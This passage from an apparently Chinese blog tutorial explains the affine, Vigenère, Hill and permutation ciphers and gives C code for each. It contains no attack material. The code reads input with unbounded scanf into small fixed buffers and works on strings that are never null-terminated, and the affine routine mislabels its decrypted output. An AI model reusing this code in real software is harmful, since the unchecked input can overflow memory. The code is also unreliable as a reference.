<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Affine_D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">10</span>],c[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> a,b,r;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥K：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">    <span class="keyword">for</span>(r=<span class="number">0</span>;r&lt;<span class="number">26</span>;r++)</span><br><span class="line">        <span class="keyword">if</span>(a*r%<span class="number">26</span>==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">            p[i]=r*(c[i]-<span class="string">&#x27;A&#x27;</span>-b+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">            p[i]=r*(c[i]-<span class="string">&#x27;a&#x27;</span>-b+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li>解密效果如下：<br><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418131238.png" alt="alt 仿射密码解密"></li>
</ul>
<h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li>前面介绍的可以归结为单表代换密码，一旦密钥被选定，则每个字母对应的数字都被加密变换成对应的唯一数字，很容易被破解。下面介绍的维吉尼亚密码$(Vigenere\; Cipher)$是一种多表代换密码。</li>
<li>维吉尼亚密码一次加密$m\;$个字符，对应的密钥字为$m$个字符组成的串，对明文进行分组处理，处理的结果仍在$Z_{26}\;$下的运算。</li>
</ul>
<h3 id="密码体制-3"><a href="#密码体制-3" class="headerlink" title="密码体制"></a>密码体制</h3><ul>
<li>设$m\;$是一个正整数。定义$P=C=K=(Z_{26})^m$。对任意的密钥$K=(k_1,k_2,\cdots ,k_m)$，定义$e_k(x_1,x_2,\cdots ,x_m)=(x_1+k_1,x_2+k_2,\cdots ,x_m+k_m)$和$d_k(y_1,y_2,\cdots ,y_m)=(y_1-k_1,y_2-k_2,\cdots ,y_m-k_m)$。且以上所有运算都是在$Z_{26}$上进行。</li>
<li>维吉尼亚密码空间大小为$26^m$，所以即使$m$的值很小，穷尽密钥搜索算法也需要很长的时间。<h3 id="代码实现-3"><a href="#代码实现-3" class="headerlink" title="代码实现"></a>代码实现</h3></li>
<li><p>假设这里$m=6$，密钥字为$CIPHER$，其对应的数字串$K=(2,8,15,7,4,17)$。要加密的明文为：$WelcomeToHuazhongUniversityOfScienceAndTechnology$。首先将明文串转化为对应的数字串，再与对应的密钥数字进行相加后模26运算，再将对应的数字串转化为字符串即可。</p>
</li>
<li><p>加密代码实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Vig_E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">char</span> SecertKey[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥字长度和密钥字串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %s&quot;</span>,&amp;m,&amp;SecertKey);</span><br><span class="line">    <span class="comment">//将密钥字串转化为数字串</span></span><br><span class="line">    <span class="keyword">int</span> NumberKey[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(SecertKey);i++)</span><br><span class="line">        NumberKey[i]=SecertKey[i]-<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>],c[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入明文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">            c[i]=(p[i]-<span class="string">&#x27;A&#x27;</span>+NumberKey[i%m])%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">            c[i]=(p[i]-<span class="string">&#x27;a&#x27;</span>+NumberKey[i%m])%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>加密效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418142907.png" alt="alt 维吉尼亚密码加密"></p>
</li>
<li><p>解密代码实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Vig_D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">char</span> SecertKey[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥字长度和密钥字串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %s&quot;</span>,&amp;m,&amp;SecertKey);</span><br><span class="line">    <span class="comment">//将密钥字串转化为数字串</span></span><br><span class="line">    <span class="keyword">int</span> NumberKey[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(SecertKey);i++)</span><br><span class="line">        NumberKey[i]=SecertKey[i]-<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>],c[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;明文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">            p[i]=(c[i]-<span class="string">&#x27;A&#x27;</span>-NumberKey[i%m]+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">            p[i]=(c[i]-<span class="string">&#x27;a&#x27;</span>-NumberKey[i%m]+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>解密效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418143203.png" alt="alt 维吉尼亚密码解密"></p>
</li>
</ul>
<h2 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li>希尔密码的思想是利用线性变换的方法，同以上的方法一样，运算都是在$Z_{26}$上进行的。具体的其他介绍可自行查询。</li>
<li>引理1：矩阵$K$在模26情形下存在可逆矩阵的充分必要条件是$gcd(det(K),26)=1$。</li>
<li>定理1：设$K=(k_{i,j})$是一个定义在$Z_{26}$上的$m\times m$矩阵，若$K$在$Z_n$上可逆，则有$K^{-1}=(det\ K)^{-1}K^<em>$，这里$K^</em>$为矩阵$K$的伴随矩阵。</li>
<li>推论1：对$2\times 2$矩阵，设矩阵$K=\left[\begin{matrix} k_{1,1} &amp; k_{1,2} \\ k_{2,1} &amp; k_{2,2}\end{matrix} \right]$是一个定义在$Z_n$上的矩阵。$det\ K=k_{1,1}k_{2,2}-k_{1,2}k_{2,1}$是可逆的，则有：$K^{-1}=(det\ K)^{-1}\left[\begin{matrix}k_{2,2} &amp; -k_{1,2}\\ -k_{2,1} &amp; k_{1,1} \end{matrix} \right]$。</li>
</ul>
<h3 id="密码体制-4"><a href="#密码体制-4" class="headerlink" title="密码体制"></a>密码体制</h3><ul>
<li>设$m\geq2$为正整数，$P=C=(Z_{26})^m$，且$K={定义在Z_{26}上的m\times m可逆矩阵}$，对任意的密钥$K$，定义：$e_k(x)=xK$和$d_k(y)=yK^{-1}$。以上运算都是在$Z_{26}$上进行的。</li>
</ul>
<h3 id="代码实现-4"><a href="#代码实现-4" class="headerlink" title="代码实现"></a>代码实现</h3><ul>
<li><p>函数代码实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Hill</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> MAX=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> K1[<span class="number">2</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;, K2[<span class="number">2</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> Temp1[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;, Temp2[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> text[MAX] = &#123;<span class="number">0</span>&#125;,result[MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> T1[MAX] = &#123;<span class="number">0</span>&#125;, T2[MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> len, flag=<span class="number">0</span>, temp, temp1, i, j, num=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请填写明文或者密文:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%[^\n]&quot;</span>,text);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请选择加密方式，输入1加密，输入2解密:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥k（以空格分开的数组）:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">2</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;K1[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">/**加密**/</span></span><br><span class="line">        len = <span class="built_in">strlen</span>(text);</span><br><span class="line">        <span class="comment">// 当长度为奇数时补齐一位</span></span><br><span class="line">        <span class="keyword">if</span>(len % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            text[len] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            len = <span class="built_in">strlen</span>(text);</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将大写转成小写，并赋值给T1数组</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(text[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; text[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                text[i] = text[i] + <span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            T1[i] = text[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 得到加密后结果，存储在T2中</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Temp1[<span class="number">0</span>] = T1[i];</span><br><span class="line">            Temp1[<span class="number">1</span>] = T1[i + <span class="number">1</span>];</span><br><span class="line">            <span class="comment">// Temp2存储密文int值</span></span><br><span class="line">            Temp2[<span class="number">0</span>] = (Temp1[<span class="number">0</span>] * K1[<span class="number">0</span>][<span class="number">0</span>] + Temp1[<span class="number">1</span>] * K1[<span class="number">1</span>][<span class="number">0</span>]) % <span class="number">26</span>;</span><br><span class="line">            Temp2[<span class="number">1</span>] = (Temp1[<span class="number">0</span>] * K1[<span class="number">0</span>][<span class="number">1</span>] + Temp1[<span class="number">1</span>] * K1[<span class="number">1</span>][<span class="number">1</span>]) % <span class="number">26</span>;</span><br><span class="line">            T2[i] = Temp2[<span class="number">0</span>];</span><br><span class="line">            T2[i + <span class="number">1</span>] = Temp2[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            len = len - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            result[i] = T2[i] + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;明文%s的密文为:%s\n&quot;</span>,text,result);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="comment">/**解密**/</span></span><br><span class="line">        len = <span class="built_in">strlen</span>(text);</span><br><span class="line">        <span class="comment">// 当长度为奇数时补齐一位</span></span><br><span class="line">        <span class="keyword">if</span>(len % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            text[len] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            len = <span class="built_in">strlen</span>(text);</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(text[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; text[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                text[i] = text[i] + <span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            T2[i] = text[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 求K的逆</span></span><br><span class="line">        temp = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>; temp &lt; <span class="number">0</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = (K1[<span class="number">0</span>][<span class="number">0</span>] * K1[<span class="number">1</span>][<span class="number">1</span>] - K1[<span class="number">0</span>][<span class="number">1</span>] * K1[<span class="number">1</span>][<span class="number">0</span>]) + <span class="number">26</span> * i;</span><br><span class="line">        &#125;</span><br><span class="line">        i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((temp * i) % <span class="number">26</span> == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                temp1 = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        K2[<span class="number">0</span>][<span class="number">0</span>] = K1[<span class="number">1</span>][<span class="number">1</span>] * temp1;</span><br><span class="line">        K2[<span class="number">0</span>][<span class="number">1</span>] = (((<span class="number">-1</span> * K1[<span class="number">0</span>][<span class="number">1</span>]) + <span class="number">26</span>) * temp1) % <span class="number">26</span>;</span><br><span class="line">        K2[<span class="number">1</span>][<span class="number">0</span>] = (((<span class="number">-1</span> * K1[<span class="number">1</span>][<span class="number">0</span>]) + <span class="number">26</span>) * temp1) % <span class="number">26</span>;</span><br><span class="line">        K2[<span class="number">1</span>][<span class="number">1</span>] = K1[<span class="number">0</span>][<span class="number">0</span>] * temp1;</span><br><span class="line">        <span class="comment">// 得到解密后结果，存储在T2中</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Temp2[<span class="number">0</span>] = T2[i];</span><br><span class="line">            Temp2[<span class="number">1</span>] = T2[i + <span class="number">1</span>];</span><br><span class="line">            <span class="comment">// Temp1存储明文int值</span></span><br><span class="line">            Temp1[<span class="number">0</span>] = (Temp2[<span class="number">0</span>] * K2[<span class="number">0</span>][<span class="number">0</span>] + Temp2[<span class="number">1</span>] * K2[<span class="number">1</span>][<span class="number">0</span>]) % <span class="number">26</span>;</span><br><span class="line">            Temp1[<span class="number">1</span>] = (Temp2[<span class="number">0</span>] * K2[<span class="number">0</span>][<span class="number">1</span>] + Temp2[<span class="number">1</span>] * K2[<span class="number">1</span>][<span class="number">1</span>]) % <span class="number">26</span>;</span><br><span class="line">            T1[i] = Temp1[<span class="number">0</span>];</span><br><span class="line">            T1[i + <span class="number">1</span>] = Temp1[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            len = len - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            result[i] = T1[i] + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;密文%s的明文为:%s\n&quot;</span>,text,result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>加密效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418213734.png" alt="alt 希尔密码加密"></p>
</li>
<li><p>解密效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418213816.png" alt="alt 希尔密码解密"></p>
</li>
</ul>
<h2 id="置换密码"><a href="#置换密码" class="headerlink" title="置换密码"></a>置换密码</h2><h3 id="介绍-5"><a href="#介绍-5" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li>代换密码：明文字母被不同的密文字母所代替。</li>
<li>置换密码：保持明文字母不变，利用置换打乱了明文字母的位置和次序。</li>
<li>定义在有限集$X$上的一个置换是一个双射函数$\pi :X\rightarrow X$。即对于任意的$x\in\ X$，存在唯一的$x^{‘}\in \ X$使得$\pi(x^{‘})=x\ $。则逆置换$\pi^{-1}:X\rightarrow X:\pi^{-1}(x)=x^{‘}\ 当且仅当\ \pi(x^{‘})=x$。</li>
</ul>
<h3 id="密码体制-5"><a href="#密码体制-5" class="headerlink" title="密码体制"></a>密码体制</h3><ul>
<li>令$m$为一正整数。$P=C=(Z_{26})^m$，$K\ $是由所有定义在集合$\{1,2,\cdots ,m\}$上的置换组成。对任意的密钥（即置换）$\pi$，定义：$e_{\pi}(x_1,x_2,\cdots ,x_m)=(x_{\pi_{(1)}},x_{\pi_{(2)}},\cdots,x_{\pi_{(m)}})$和$d_{\pi}(y_1,y_2,\cdots,y_m)=(y_{\pi^{-1}(1)},y_{\pi^{-1}(2)},\cdots,y_{\pi^{-1}(m)})$。其中$\pi^{-1}$为置换$\pi$的逆置换。</li>
</ul>
<h3 id="代码实现-5"><a href="#代码实现-5" class="headerlink" title="代码实现"></a>代码实现</h3><ul>
<li><p>代码加密实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Per_E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">50</span>],c[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> x[<span class="number">26</span>];<span class="comment">//置换密钥</span></span><br><span class="line">    <span class="keyword">int</span> t,k,len,a=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你要输入的明文：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,p);</span><br><span class="line">    len=<span class="built_in">strlen</span>(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入密钥长度：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    t=k-len%k; <span class="comment">//补全位数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;t;i++)</span><br><span class="line">        p[len+i]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你选择的密钥方式：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;(len+t)/k; j++) <span class="comment">//分组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            c[a++]=p[x[i]+k*j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=len+t; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>加密效果：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418225710.png" alt="alt 置换密码加密"></p>
</li>
<li><p>代码解密实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Per_D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="keyword">char</span> p[<span class="number">50</span>],c[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> x[<span class="number">26</span>];<span class="comment">//置换密钥</span></span><br><span class="line">    <span class="keyword">int</span> k,len,a=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你要输入的密文：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,p);</span><br><span class="line">    len=<span class="built_in">strlen</span>(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入密钥长度：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你选择的密钥方式：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> y[<span class="number">26</span>];<span class="comment">//逆置换</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;k;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x[j]==(i+<span class="number">1</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                  y[i]=j+<span class="number">1</span>;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;len/k; j++) <span class="comment">//分组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            c[a++]=p[y[i]+k*j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;明文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>解密效果：</p>
<p>同加密函数内容基本一样，区别在于将使用的置换更换为输入置换$\pi$的逆置换$\pi^{-1}$即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418231325.png" alt="alt 置换密码解密"></p>
</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://blog.csdn.net/weixin_44883180/article/details/109009221">几种古典密码学算法的C实现</a></li>
<li><a href="https://blog.csdn.net/qq_45163122/article/details/104482811">希尔（Hill）密码（C语言）</a></li>
<li><a href="https://blog.csdn.net/dyw_666666/article/details/82466894">置换密码代码简单实现（C语言）</a></li>
</ul>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
